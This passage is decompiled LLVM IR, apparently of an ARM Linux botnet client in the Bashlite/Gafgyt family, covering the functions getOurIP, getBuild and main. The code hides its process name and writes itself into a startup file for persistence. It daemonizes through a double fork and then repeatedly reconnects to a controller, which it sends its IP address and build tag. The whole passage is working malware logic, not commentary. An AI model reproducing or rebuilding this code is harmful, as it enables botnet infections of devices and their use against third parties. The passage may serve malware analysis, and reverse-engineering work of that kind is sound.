  %v5_100066cc = call i32 @connectTimeout(i32 %v3_100066a0, i32 %v2_10006584, i32 %stack_var_-4136.0, i32 30, i32 %v2_10006584)
  %v3_100066d4 = icmp eq i32 %v5_100066cc, 0
  %. = zext i1 %v3_100066d4 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v2_10006584, { 1, 0, 3, 2, 5, 4, 7, 6, 8, 9 }
  uselistorder i32 (i32, i32)* @atol, { 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10006694, { 1, 0 }
  uselistorder label %dec_label_pc_100065fc, { 1, 0 }
  uselistorder label %dec_label_pc_100065c8, { 1, 0 }
}

define i32 @getOurIP() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-46 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-4160 = alloca i8, align 1
  %stack_var_-4164 = alloca i32, align 4
  %stack_var_-4180 = alloca i32, align 4
  %stack_var_-4196 = alloca i32, align 4
  store i32 268461876, i32* @lr, align 4
  %v3_10006730 = call i32 @socket(i32 2, i32 2, i32 0)
  %v4_10006744 = icmp eq i32 %v3_10006730, -1
  br i1 %v4_10006744, label %dec_label_pc_1000674c, label %dec_label_pc_10006758

dec_label_pc_1000674c:                            ; preds = %entry
  br label %dec_label_pc_10006984

dec_label_pc_10006758:                            ; preds = %entry
  %v2_10006758 = ptrtoint i32* %stack_var_-4196 to i32
  store i32 2, i32* %stack_var_-4196, align 4
  store i32 268461968, i32* @lr, align 4
  %v2_1000678c = call i32 @inet_addr(i32 ptrtoint ([8 x i8]* @global_var_100113f8.232 to i32))
  store i32 53, i32* @r3, align 4
  %v1_1000679c = call i32 @htons(i32 53)
  store i32 268462012, i32* @lr, align 4
  %v3_100067b8 = call i32 @__libc_connect(i32 %v3_10006730, i32 %v2_10006758, i32 16)
  %v4_100067cc = icmp eq i32 %v3_100067b8, -1
  br i1 %v4_100067cc, label %dec_label_pc_100067d4, label %dec_label_pc_100067e0

dec_label_pc_100067d4:                            ; preds = %dec_label_pc_10006758
  br label %dec_label_pc_10006984

dec_label_pc_100067e0:                            ; preds = %dec_label_pc_10006758
  store i32 16, i32* %stack_var_-4164, align 4
  %v2_100067e8 = ptrtoint i32* %stack_var_-4180 to i32
  %v2_100067ec = ptrtoint i32* %stack_var_-4164 to i32
  store i32 268462080, i32* @lr, align 4
  %v4_100067fc = call i32 @__GI_getsockname(i32 %v3_10006730, i32 %v2_100067e8, i32 %v2_100067ec, i32 %v2_100067ec)
  %v4_10006810 = icmp eq i32 %v4_100067fc, -1
  br i1 %v4_10006810, label %dec_label_pc_10006818, label %dec_label_pc_10006824

dec_label_pc_10006818:                            ; preds = %dec_label_pc_100067e0
  br label %dec_label_pc_10006984

dec_label_pc_10006824:                            ; preds = %dec_label_pc_100067e0
  store i32 268462148, i32* @lr, align 4
  %v3_10006840 = call i32 @__libc_open(i32 ptrtoint ([16 x i8]* @global_var_10011400.233 to i32), i32 0)
  %v2_100068c4 = ptrtoint i8* %stack_var_-4160 to i32
  br label %dec_label_pc_100068c4

dec_label_pc_10006850:                            ; preds = %dec_label_pc_100068c4
  store i32 268462180, i32* @lr, align 4
  %v6_10006860 = call i32 @strstr(i32 %v2_100068c4, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_10011410.234, i32 0, i32 0), i32 ptrtoint ([31 x i8]* @global_var_10010000.5 to i32))
  %v3_10006868 = icmp eq i32 %v6_10006860, 0
  br i1 %v3_10006868, label %dec_label_pc_100068ac, label %dec_label_pc_10006888.preheader

dec_label_pc_10006888.preheader:                  ; preds = %dec_label_pc_10006850
  %v2_1000688c10 = load i8, i8* %stack_var_-4160, align 1
  %v3_1000689414 = icmp eq i8 %v2_1000688c10, 9
  br i1 %v3_1000689414, label %dec_label_pc_1000689c, label %dec_label_pc_1000687c

dec_label_pc_1000687c:                            ; preds = %dec_label_pc_10006888.preheader, %dec_label_pc_1000687c
  %v4_1000688815 = phi i32 [ %v1_10006880, %dec_label_pc_1000687c ], [ %v2_100068c4, %dec_label_pc_10006888.preheader ]
  %v1_10006880 = add i32 %v4_1000688815, 1
  %v5_10006884 = inttoptr i32 %v1_10006880 to i8*
  %v2_1000688c = load i8, i8* %v5_10006884, align 1
  %v3_10006894 = icmp eq i8 %v2_1000688c, 9
  br i1 %v3_10006894, label %dec_label_pc_1000689c, label %dec_label_pc_1000687c

dec_label_pc_1000689c:                            ; preds = %dec_label_pc_1000687c, %dec_label_pc_10006888.preheader
  %storemerge4.lcssa = phi i8* [ %stack_var_-4160, %dec_label_pc_10006888.preheader ], [ %v5_10006884, %dec_label_pc_1000687c ]
  store i8 0, i8* %storemerge4.lcssa, align 1
  br label %dec_label_pc_100068e4

dec_label_pc_100068ac:                            ; preds = %dec_label_pc_10006850
  store i32 268462276, i32* @lr, align 4
  %v3_100068c0 = call i32 @__GI_memset(i32 %v2_100068c4, i32 0, i32 4096)
  br label %dec_label_pc_100068c4

dec_label_pc_100068c4:                            ; preds = %dec_label_pc_10006824, %dec_label_pc_100068ac
  %v3_100068d4 = call i32 @fdgets(i32 %v2_100068c4, i32 4096, i32 %v3_10006840)
  %v3_100068dc = icmp eq i32 %v3_100068d4, 0
  br i1 %v3_100068dc, label %dec_label_pc_100068e4, label %dec_label_pc_10006850

dec_label_pc_100068e4:                            ; preds = %dec_label_pc_100068c4, %dec_label_pc_1000689c
  store i32 268462316, i32* @lr, align 4
  %v1_100068e8 = call i32 @__libc_close(i32 %v3_10006840)
  %v3_100068ec = load i8, i8* %stack_var_-4160, align 1
  %v3_100068f4 = icmp eq i8 %v3_100068ec, 0
  br i1 %v3_100068f4, label %dec_label_pc_10006978, label %dec_label_pc_100068fc

dec_label_pc_100068fc:                            ; preds = %dec_label_pc_100068e4
  %v2_100068fc = ptrtoint i32* %stack_var_-64 to i32
  %v3_1000690c = call i32 @strcpy(i32 %v2_100068fc, i8* nonnull %stack_var_-4160)
  store i32 ptrtoint (i32* @global_var_1000692c.235 to i32), i32* @lr, align 4
  %v3_10006928 = call i32 @ioctl(i32 %v3_10006730, i32 35111, i32 %v2_100068fc)
  %v2_10006940 = ptrtoint i32* %stack_var_-46 to i32
  br label %dec_label_pc_10006938

dec_label_pc_10006938:                            ; preds = %dec_label_pc_100068fc, %dec_label_pc_10006938
  %storemerge58 = phi i32 [ 0, %dec_label_pc_100068fc ], [ %v1_10006964, %dec_label_pc_10006938 ]
  %v2_10006948 = add i32 %storemerge58, %v2_10006940
  %v1_1000694c = inttoptr i32 %v2_10006948 to i8*
  %v2_1000694c = load i8, i8* %v1_1000694c, align 1
  %v4_1000695c = add i32 %storemerge58, ptrtoint (i32* @global_var_10023520.236 to i32)
  %v5_1000695c = inttoptr i32 %v4_1000695c to i8*
  store i8 %v2_1000694c, i8* %v5_1000695c, align 1
  %v1_10006964 = add nuw nsw i32 %storemerge58, 1
  %tmp37 = icmp slt i32 %v1_10006964, 6
  br i1 %tmp37, label %dec_label_pc_10006938, label %dec_label_pc_10006978

dec_label_pc_10006978:                            ; preds = %dec_label_pc_10006938, %dec_label_pc_100068e4
  store i32 ptrtoint (i32* @global_var_10006980.237 to i32), i32* @lr, align 4
  %v1_1000697c = call i32 @__libc_close(i32 %v3_10006730)
  br label %dec_label_pc_1000698c

dec_label_pc_10006984:                            ; preds = %dec_label_pc_10006818, %dec_label_pc_100067d4, %dec_label_pc_1000674c
  br label %dec_label_pc_1000698c

dec_label_pc_1000698c:                            ; preds = %dec_label_pc_10006978, %dec_label_pc_10006984
  %stack_var_-20.0 = phi i32 [ 0, %dec_label_pc_10006984 ], [ %tmp, %dec_label_pc_10006978 ]
  ret i32 %stack_var_-20.0

; uselistorder directives
  uselistorder i32 %storemerge58, { 2, 1, 0 }
  uselistorder i32 %v1_10006880, { 1, 0 }
  uselistorder i32 %v2_100068c4, { 3, 1, 0, 2 }
  uselistorder i32 %v3_10006730, { 1, 0, 2, 3, 4 }
  uselistorder i32* %stack_var_-4164, { 1, 0 }
  uselistorder i8* %stack_var_-4160, { 2, 4, 0, 1, 3 }
  uselistorder i8 9, { 1, 0, 2, 3 }
  uselistorder i32 (i32)* @htons, { 10, 9, 8, 7, 6, 5, 4, 11, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1000698c, { 1, 0 }
  uselistorder label %dec_label_pc_10006938, { 1, 0 }
  uselistorder label %dec_label_pc_100068c4, { 1, 0 }
  uselistorder label %dec_label_pc_1000687c, { 1, 0 }
}

define i32 @getBuild() local_unnamed_addr {
entry:
  ret i32 ptrtoint ([8 x i8]* @global_var_1001141c.238 to i32)
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8** %argv to i32
  %stack_var_-4192 = alloca i32, align 4
  %stack_var_-5816 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-5732 = alloca i32, align 4
  %stack_var_-5216 = alloca i32, align 4
  %stack_var_-5472 = alloca i32, align 4
  %stack_var_-5728 = alloca i32, align 4
  %v1_10006a04 = bitcast i8** %argv to i32*
  %v2_10006a04 = load i32, i32* %v1_10006a04, align 4
  store i32 %v2_10006a04, i32* @r3, align 4
  %v0_10006a18 = call i32 @__GI_strlen()
  store i32 ptrtoint (i32* @global_var_10011424.239 to i32), i32* @r4, align 4
  store i32 268462644, i32* @lr, align 4
  %v3_10006a30 = call i32 @strncpy(i32 %v2_10006a04, i32 ptrtoint (i32* @global_var_10011424.239 to i32), i32 %v0_10006a18)
  store i32 ptrtoint (i32* @global_var_10011424.239 to i32), i32* %v1_10006a04, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10006a64.240 to i32), i32* @lr, align 4
  %v7_10006a60 = call i32 @prctl(i32 15, i32 ptrtoint (i32* @global_var_10011424.239 to i32), i32 0, i32 0, i32 0, i32 %tmp)
  store i32 268462700, i32* @lr, align 4
  %v1_10006a68 = call i32 @__GI_time(i32 0)
  store i32 268462708, i32* @lr, align 4
  %v0_10006a70 = call i32 @__libc_getpid()
  %v2_10006a78 = xor i32 %v1_10006a68, %v0_10006a70
  store i32 ptrtoint ([3 x i8]* @global_var_10006a84.241 to i32), i32* @lr, align 4
  %v1_10006a80 = call i32 @srand(i32 %v2_10006a78)
  store i32 268462732, i32* @lr, align 4
  %v1_10006a88 = call i32 @__GI_time(i32 0)
  store i32 268462740, i32* @lr, align 4
  %v0_10006a90 = call i32 @__libc_getpid()
  %v2_10006a98 = xor i32 %v1_10006a88, %v0_10006a90
  %v1_10006aa0 = call i32 @init_rand(i32 %v2_10006a98)
  store i32 268462792, i32* @lr, align 4
  %v3_10006ac4 = call i32 @__GI_fopen(i32 ptrtoint ([19 x i8]* @global_var_10011428.243 to i32), i32 ptrtoint ([2 x i8]* @global_var_1001143c.244 to i32))
  %v3_10006ad4 = icmp eq i32 %v3_10006ac4, 0
  br i1 %v3_10006ad4, label %dec_label_pc_10006adc, label %dec_label_pc_10006b00

dec_label_pc_10006adc:                            ; preds = %entry
  store i32 268462840, i32* @lr, align 4
  %v3_10006af4 = call i32 @__GI_fopen(i32 ptrtoint ([13 x i8]* @global_var_10011440.245 to i32), i32 ptrtoint ([2 x i8]* @global_var_1001143c.244 to i32))
  br label %dec_label_pc_10006b00

dec_label_pc_10006b00:                            ; preds = %entry, %dec_label_pc_10006adc
  %stack_var_-5756.0 = phi i32 [ %v3_10006af4, %dec_label_pc_10006adc ], [ %v3_10006ac4, %entry ]
  %stack_var_-5752.0 = phi i8* [ getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_10011440.245, i32 0, i32 0), %dec_label_pc_10006adc ], [ getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_10011428.243, i32 0, i32 0), %entry ]
  %v3_10006b04 = icmp eq i32 %stack_var_-5756.0, 0
  br i1 %v3_10006b04, label %dec_label_pc_10006c80, label %dec_label_pc_10006b0c

dec_label_pc_10006b0c:                            ; preds = %dec_label_pc_10006b00
  %v2_10006b10 = load i32, i32* %v1_10006a04, align 4
  store i32 %v2_10006b10, i32* @r3, align 4
  %v0_10006b18 = call i32 @__GI_strlen()
  %v2_10006b2c = ptrtoint i32* %stack_var_-5728 to i32
  store i32 268462908, i32* @lr, align 4
  %v2_10006b38 = call i32 @getcwd(i32 %v2_10006b2c, i32 256)
  store i32 ptrtoint (i32* @global_var_10011450.246 to i32), i32* @r4, align 4
  %v2_10006b4c = bitcast i32* %stack_var_-5728 to i8*
  %v3_10006b4c = call i32 @__GI_strcoll(i8* %v2_10006b4c, i32 ptrtoint (i32* @global_var_10011450.246 to i32))
  %v3_10006b54 = icmp eq i32 %v3_10006b4c, 0
  br i1 %v3_10006b54, label %dec_label_pc_10006c78, label %dec_label_pc_10006b6c.preheader

dec_label_pc_10006b6c.preheader:                  ; preds = %dec_label_pc_10006b0c
  %v2_10006b70115 = load i32, i32* %v1_10006a04, align 4
  %v2_10006b78116 = add i32 %v2_10006b70115, %v0_10006b18
  %v1_10006b7c117 = inttoptr i32 %v2_10006b78116 to i8*
  %v2_10006b7c118 = load i8, i8* %v1_10006b7c117, align 1
  %v3_10006b84122 = icmp eq i8 %v2_10006b7c118, 47
  br i1 %v3_10006b84122, label %dec_label_pc_10006b8c, label %dec_label_pc_10006b60

dec_label_pc_10006b60:                            ; preds = %dec_label_pc_10006b6c.preheader, %dec_label_pc_10006b60
  %stack_var_-5760.0123 = phi i32 [ %v1_10006b64, %dec_label_pc_10006b60 ], [ %v0_10006b18, %dec_label_pc_10006b6c.preheader ]
  %v1_10006b64 = add i32 %stack_var_-5760.0123, -1
  %v2_10006b70 = load i32, i32* %v1_10006a04, align 4
  %v2_10006b78 = add i32 %v2_10006b70, %v1_10006b64
  %v1_10006b7c = inttoptr i32 %v2_10006b78 to i8*
  %v2_10006b7c = load i8, i8* %v1_10006b7c, align 1
  %v3_10006b84 = icmp eq i8 %v2_10006b7c, 47
  br i1 %v3_10006b84, label %dec_label_pc_10006b8c, label %dec_label_pc_10006b60

dec_label_pc_10006b8c:                            ; preds = %dec_label_pc_10006b60, %dec_label_pc_10006b6c.preheader
  %stack_var_-5760.0.lcssa = phi i32 [ %v0_10006b18, %dec_label_pc_10006b6c.preheader ], [ %v1_10006b64, %dec_label_pc_10006b60 ]
  %v2_10006b90 = load i32, i32* %v1_10006a04, align 4
  %v2_10006b98 = add i32 %v2_10006b90, %stack_var_-5760.0.lcssa
  %v2_10006b9c = ptrtoint i32* %stack_var_-5472 to i32
  store i32 %v2_10006b9c, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10006bc0.248 to i32), i32* @lr, align 4
  %v7_10006bbc = load i32, i32* @r8, align 4
  %v11_10006bbc = call i32 @sprintf(i32 %v2_10006b9c, i32 ptrtoint ([8 x i8]* @global_var_10011454.247 to i32), i32 %v2_10006b2c, i32 %v2_10006b98, i32 ptrtoint ([31 x i8]* @global_var_10010000.5 to i32), i32 %v7_10006bbc, i32 ptrtoint ([31 x i8]* @global_var_10010000.5 to i32), i32 ptrtoint (i32* @0 to i32))
  %v2_10006bc4 = ptrtoint i32* %stack_var_-5216 to i32
  br label %dec_label_pc_10006c04.outer

dec_label_pc_10006bc4:                            ; preds = %dec_label_pc_10006c04
  store i32 268463064, i32* @lr, align 4
  %v3_10006bd4 = call i32 @fgets(i32 %v2_10006bc4, i32 1024, i32 %stack_var_-5756.0)
  store i32 %v2_10006bc4, i32* @r3, align 4
  store i32 %v2_10006b9c, i32* @r4, align 4
  %v2_10006be8 = call i32 @__GI_strcasecmp(i32 %v2_10006bc4, i32 %v2_10006b9c)
  %v3_10006bf0 = icmp eq i32 %v2_10006be8, 0
  br i1 %v3_10006bf0, label %dec_label_pc_10006bf8, label %dec_label_pc_10006c04

dec_label_pc_10006bf8:                            ; preds = %dec_label_pc_10006bc4
  %v1_10006bfc = add i32 %stack_var_-5764.0.ph, 1
  br label %dec_label_pc_10006c04.outer

dec_label_pc_10006c04.outer:                      ; preds = %dec_label_pc_10006bf8, %dec_label_pc_10006b8c
  %stack_var_-5764.0.ph = phi i32 [ %v1_10006bfc, %dec_label_pc_10006bf8 ], [ 0, %dec_label_pc_10006b8c ]
  br label %dec_label_pc_10006c04

dec_label_pc_10006c04:                            ; preds = %dec_label_pc_10006c04.outer, %dec_label_pc_10006bc4
  store i32 268463116, i32* @lr, align 4
  %v1_10006c08 = call i32 @feof(i32 %stack_var_-5756.0)
  %v3_10006c10 = icmp eq i32 %v1_10006c08, 0
  br i1 %v3_10006c10, label %dec_label_pc_10006bc4, label %dec_label_pc_10006c18

dec_label_pc_10006c18:                            ; preds = %dec_label_pc_10006c04
  %v3_10006c1c = icmp eq i32 %stack_var_-5764.0.ph, 0
  br i1 %v3_10006c1c, label %dec_label_pc_10006c24, label %dec_label_pc_10006c6c

dec_label_pc_10006c24:                            ; preds = %dec_label_pc_10006c18
  store i32 268463148, i32* @lr, align 4
  %v1_10006c28 = inttoptr i32 %stack_var_-5756.0 to i16*
  %v2_10006c28 = call i32 @__GI_fclose(i16* %v1_10006c28)
  %v4_10006c2c = ptrtoint i8* %stack_var_-5752.0 to i32
  store i32 268463164, i32* @lr, align 4
  %v3_10006c38 = call i32 @__GI_fopen(i32 %v4_10006c2c, i32 ptrtoint (i32* @global_var_1001145c.249 to i32))
  %v3_10006c48 = icmp eq i32 %v3_10006c38, 0
  br i1 %v3_10006c48, label %dec_label_pc_10006c80, label %dec_label_pc_10006c50

dec_label_pc_10006c50:                            ; preds = %dec_label_pc_10006c24
  store i32 268463200, i32* @lr, align 4
  %v2_10006c5c = call i32 @__GI_fputs(i32 %v2_10006b9c, i32 %v3_10006c38)
  store i32 ptrtoint (i32* @global_var_10006c68.250 to i32), i32* @lr, align 4
  %v1_10006c64 = inttoptr i32 %v3_10006c38 to i16*
  %v2_10006c64 = call i32 @__GI_fclose(i16* %v1_10006c64)
  br label %dec_label_pc_10006c80

dec_label_pc_10006c6c:                            ; preds = %dec_label_pc_10006c18
  store i32 ptrtoint (i32* @global_var_10006c74.251 to i32), i32* @lr, align 4
  %v1_10006c70 = inttoptr i32 %stack_var_-5756.0 to i16*
  %v2_10006c70 = call i32 @__GI_fclose(i16* %v1_10006c70)
  br label %dec_label_pc_10006c80

dec_label_pc_10006c78:                            ; preds = %dec_label_pc_10006b0c
  store i32 268463232, i32* @lr, align 4
  %v1_10006c7c = inttoptr i32 %stack_var_-5756.0 to i16*
  %v2_10006c7c = call i32 @__GI_fclose(i16* %v1_10006c7c)
  br label %dec_label_pc_10006c80

dec_label_pc_10006c80:                            ; preds = %dec_label_pc_10006c24, %dec_label_pc_10006b00, %dec_label_pc_10006c6c, %dec_label_pc_10006c50, %dec_label_pc_10006c78
  store i32 ptrtoint (i32* @global_var_10006c84.252 to i32), i32* @lr, align 4
  %v0_10006c80 = call i32 @getOurIP()
  store i32 268463240, i32* @lr, align 4
  %v0_10006c84 = call i32 @__libc_fork()
  %v3_10006c94 = icmp eq i32 %v0_10006c84, 0
  br i1 %v3_10006c94, label %dec_label_pc_10006cc4, label %dec_label_pc_10006d08

dec_label_pc_10006cc4:                            ; preds = %dec_label_pc_10006c80
  store i32 268463304, i32* @lr, align 4
  %v0_10006cc4 = call i32 @__libc_fork()
  %v3_10006cd4 = icmp eq i32 %v0_10006cc4, 0
  br i1 %v3_10006cd4, label %dec_label_pc_10006ce4.thread, label %dec_label_pc_10006cf0

dec_label_pc_10006ce4.thread:                     ; preds = %dec_label_pc_10006cc4
  br label %dec_label_pc_10006d1c

dec_label_pc_10006cf0:                            ; preds = %dec_label_pc_10006cc4
  %v0_10006ce0 = call i32 @__GI_exit()
  %v4_10006d00 = call i32 @zprintf(i32 ptrtoint ([13 x i8]* @global_var_10011460.254 to i32), i32 ptrtoint ([31 x i8]* @global_var_10010000.5 to i32))
  br label %dec_label_pc_10006d1c

dec_label_pc_10006d08:                            ; preds = %dec_label_pc_10006c80
  %v2_10006c9c = ptrtoint i32* %stack_var_-5732 to i32
  store i32 ptrtoint ([3 x i8]* @global_var_10006cb0.253 to i32), i32* @lr, align 4
  %v3_10006cac = call i32 @__libc_waitpid(i32 %v0_10006c84, i32 %v2_10006c9c, i32 0)
  %v0_10006cb4 = call i32 @__GI_exit()
  %v4_10006d18 = call i32 @zprintf(i32 ptrtoint ([13 x i8]* @global_var_10011460.254 to i32), i32 ptrtoint ([31 x i8]* @global_var_10010000.5 to i32))
  br label %dec_label_pc_10006d1c

dec_label_pc_10006d1c:                            ; preds = %dec_label_pc_10006ce4.thread, %dec_label_pc_10006cf0, %dec_label_pc_10006d08
  store i32 268463392, i32* @lr, align 4
  %v0_10006d1c = call i32 @__GI_setsid()
  store i32 ptrtoint ([3 x i8]* @global_var_10006d2c.257 to i32), i32* @lr, align 4
  %v3_10006d28 = call i32 @chdir(i32 ptrtoint (i32* @global_var_10011450.246 to i32), i32 ptrtoint ([31 x i8]* @global_var_10010000.5 to i32))
  store i32 ptrtoint (i32* @global_var_10006d38.258 to i32), i32* @lr, align 4
  %v2_10006d34 = call i32 @__bsd_signal(i32 13, i32 1)
  %v2_1000757c = ptrtoint i32* %stack_var_-4192 to i32
  %v4_1000758c = bitcast i32* %stack_var_-4192 to i8*
  %v2_10007088 = ptrtoint i32* %stack_var_-5816 to i32
  %v2_10007338 = ptrtoint i32* %stack_var_-5216 to i32
  %v1_100071a4 = or i32 %v2_1000757c, 1
  %v2_10007544 = add i32 %v2_10007088, 344
  br label %dec_label_pc_10006d3c.outer

dec_label_pc_10006d3c.outer:                      ; preds = %dec_label_pc_100070ec, %dec_label_pc_10007574, %dec_label_pc_10006d1c
  %stack_var_-5748.0.ph21 = phi i32 [ 0, %dec_label_pc_10006d1c ], [ %stack_var_-5748.2.ph, %dec_label_pc_10007574 ], [ %v1_100070f0, %dec_label_pc_100070ec ]
  %v0_10006d3c25 = call i32 @initConnection()
  %v3_10006d4428 = icmp eq i32 %v0_10006d3c25, 0
  br i1 %v3_10006d4428, label %dec_label_pc_10006d58, label %dec_label_pc_10006d4c

dec_label_pc_10006d4c:                            ; preds = %dec_label_pc_10006d3c.outer, %dec_label_pc_10006d4c
  store i32 268463444, i32* @lr, align 4
  %v1_10006d50 = call i32 @sleep(i32 30)
  %v0_10006d3c = call i32 @initConnection()
  %v3_10006d44 = icmp eq i32 %v0_10006d3c, 0
  br i1 %v3_10006d44, label %dec_label_pc_10006d58, label %dec_label_pc_10006d4c

dec_label_pc_10006d58:                            ; preds = %dec_label_pc_10006d4c, %dec_label_pc_10006d3c.outer
  %v3_10006d64 = load i32, i32* @global_var_10023538.52, align 4
  store i32 %v3_10006d64, i32* %stack_var_-80, align 4
  store i32 268463480, i32* @lr, align 4
  %v3_10006d74 = call i32 @__GI_inet_ntoa(i32* nonnull %stack_var_-80, i32 268566528)
  %v0_10006d7c = call i32 @getBuild()
  %v0_10006d84 = load i32, i32* @r29, align 4
  store i32 ptrtoint (i32* @global_var_10006da0.260 to i32), i32* @lr, align 4
  %v6_10006d9c = load i32, i32* @r8, align 4
  %v7_10006d9c = call i32 @Rootsprintf(i32 %v0_10006d84, i32 ptrtoint (i32* @global_var_10011470.259 to i32), i32 %v3_10006d74, i32 %v0_10006d7c, i32 ptrtoint ([31 x i8]* @global_var_10010000.5 to i32), i32 %v6_10006d9c)
  br label %dec_label_pc_10007574.outer

dec_label_pc_10006dc0:                            ; preds = %dec_label_pc_10007074, %dec_label_pc_10007018
  %v1_10006dc4 = mul i32 %storemerge12, 4
  %v3_10006dd0 = load i32, i32* @global_var_10023544.44, align 4
  %v2_10006dd4 = add i32 %v3_10006dd0, %v1_10006dc4
  %v1_10006dd8 = inttoptr i32 %v2_10006dd4 to i32*
  %v2_10006dd8 = load i32, i32* %v1_10006dd8, align 4
  store i32 268463596, i32* @lr, align 4
  %v3_10006de8 = call i32 @__libc_waitpid(i32 %v2_10006dd8, i32 0, i32 1)
  %tmp110 = icmp slt i32 %v3_10006de8, 1
  br i1 %tmp110, label %dec_label_pc_1000700c, label %dec_label_pc_10006e50

dec_label_pc_10006e08:                            ; preds = %dec_label_pc_10006e50, %dec_label_pc_10006e98
  %v1_10006e0c = mul i32 %v1_10006dfc, 4
  %v3_10006e18 = load i32, i32* @global_var_10023544.44, align 4
  %v2_10006e1c = add i32 %v3_10006e18, %v1_10006e0c
  %v1_10006e20 = add i32 %v2_10006e1c, -4
  %v1_10006e3c = inttoptr i32 %v2_10006e1c to i32*
  %v2_10006e3c = load i32, i32* %v1_10006e3c, align 4
  %v2_10006e40 = inttoptr i32 %v1_10006e20 to i32*
  store i32 %v2_10006e3c, i32* %v2_10006e40, align 4
  br label %dec_label_pc_10006e50

dec_label_pc_10006e50:                            ; preds = %dec_label_pc_10006dc0, %dec_label_pc_10006e08
  %storemerge18 = phi i32 [ %v1_10006dfc, %dec_label_pc_10006e08 ], [ %storemerge12, %dec_label_pc_10006dc0 ]
  %v1_10006dfc = add i32 %storemerge18, 1
  %v2_10006e78 = load i32, i32* @global_var_10023518.42, align 4
  %v3_10006e90 = icmp eq i32 %v2_10006e78, 0
  br i1 %v3_10006e90, label %dec_label_pc_10006e98, label %dec_label_pc_10006e08

dec_label_pc_10006e98:                            ; preds = %dec_label_pc_10006e50
  %v3_10006e7c = load i32, i32* @global_var_1002351c.43, align 4
  %v3_10006eb0 = icmp ugt i32 %v3_10006e7c, %v1_10006dfc
  br i1 %v3_10006eb0, label %dec_label_pc_10006e08, label %dec_label_pc_10006eb8

dec_label_pc_10006eb8:                            ; preds = %dec_label_pc_10006e98
  %v1_10006ebc = mul i32 %v1_10006dfc, 4
  %v3_10006ec8 = load i32, i32* @global_var_10023544.44, align 4
  %v2_10006ecc = add i32 %v1_10006ebc, -4
  %v1_10006ed0 = add i32 %v2_10006ecc, %v3_10006ec8
  %v2_10006ed8 = inttoptr i32 %v1_10006ed0 to i32*
  store i32 0, i32* %v2_10006ed8, align 4
  %v3_10006ee4 = load i32, i32* @global_var_1002351c.43, align 4
  %v2_10006ee8 = load i32, i32* @global_var_10023518.42, align 4
  %v1_10006eec = add i32 %v3_10006ee4, -1
  %v2_10006eec = icmp ne i32 %v3_10006ee4, 0
  %v2_10006ef0 = zext i1 %v2_10006eec to i32
  %v3_10006ef0 = add i32 %v2_10006ee8, -1
  %v4_10006ef0 = add i32 %v3_10006ef0, %v2_10006ef0
  store i32 %v4_10006ef0, i32* @global_var_10023518.42, align 4
  store i32 %v1_10006eec, i32* @global_var_1002351c.43, align 4
  %v1_10006f20 = mul i32 %v1_10006eec, 4
  %v1_10006f28 = add i32 %v1_10006f20, 4
  store i32 %v1_10006f28, i32* @r3, align 4
  store i32 268463924, i32* @lr, align 4
  %v0_10006f30 = call i32 @malloc()
  br label %dec_label_pc_10006f88

dec_label_pc_10006f48:                            ; preds = %dec_label_pc_10006f88, %dec_label_pc_10006fd0
  %v1_10006f4c = mul i32 %storemerge17, 4
  %v2_10006f58 = add i32 %v1_10006f4c, %v0_10006f30
  %v3_10006f6c = load i32, i32* @global_var_10023544.44, align 4
  %v2_10006f70 = add i32 %v3_10006f6c, %v1_10006f4c
  %v1_10006f74 = inttoptr i32 %v2_10006f70 to i32*
  %v2_10006f74 = load i32, i32* %v1_10006f74, align 4
  %v2_10006f78 = inttoptr i32 %v2_10006f58 to i32*
  store i32 %v2_10006f74, i32* %v2_10006f78, align 4
  %v1_10006f80 = add i32 %storemerge17, 1
  br label %dec_label_pc_10006f88

dec_label_pc_10006f88:                            ; preds = %dec_label_pc_10006eb8, %dec_label_pc_10006f48
  %storemerge17 = phi i32 [ 0, %dec_label_pc_10006eb8 ], [ %v1_10006f80, %dec_label_pc_10006f48 ]
  %v2_10006fb0 = load i32, i32* @global_var_10023518.42, align 4
  %v3_10006fc8 = icmp eq i32 %v2_10006fb0, 0
  br i1 %v3_10006fc8, label %dec_label_pc_10006fd0, label %dec_label_pc_10006f48

dec_label_pc_10006fd0:                            ; preds = %dec_label_pc_10006f88
  %v3_10006fb4 = load i32, i32* @global_var_1002351c.43, align 4
  %v3_10006fe8 = icmp ugt i32 %v3_10006fb4, %storemerge17
  br i1 %v3_10006fe8, label %dec_label_pc_10006f48, label %dec_label_pc_10006ff0

dec_label_pc_10006ff0:                            ; preds = %dec_label_pc_10006fd0
  %v3_10006ff4 = load i32, i32* @global_var_10023544.44, align 4
  store i32 %v3_10006ff4, i32* @r3, align 4
  store i32 268464128, i32* @lr, align 4
  %v0_10006ffc = call i32 @free()
  store i32 %v0_10006f30, i32* @global_var_10023544.44, align 4
  br label %dec_label_pc_1000700c

dec_label_pc_1000700c:                            ; preds = %dec_label_pc_10006dc0, %dec_label_pc_10006ff0
  %v1_10007010 = add i32 %storemerge12, 1
  br label %dec_label_pc_10007018

dec_label_pc_10007018:                            ; preds = %dec_label_pc_10007574, %dec_label_pc_1000700c
  %storemerge12 = phi i32 [ %v1_10007010, %dec_label_pc_1000700c ], [ 0, %dec_label_pc_10007574 ]
  %tmp125 = icmp slt i32 %storemerge12, 0
  %v1_1000701c = zext i1 %tmp125 to i32
  %v2_1000701c = ashr i32 %storemerge12, 31
  %v3_1000701c = and i32 %v2_1000701c, -2
  %v4_1000701c = or i32 %v3_1000701c, %v1_1000701c
  %v2_10007044 = load i32, i32* @global_var_10023518.42, align 4
  %v3_10007048 = load i32, i32* @global_var_1002351c.43, align 4
  %v3_1000705c = icmp ugt i32 %v2_10007044, %v4_1000701c
  br i1 %v3_1000705c, label %dec_label_pc_10006dc0, label %dec_label_pc_10007064

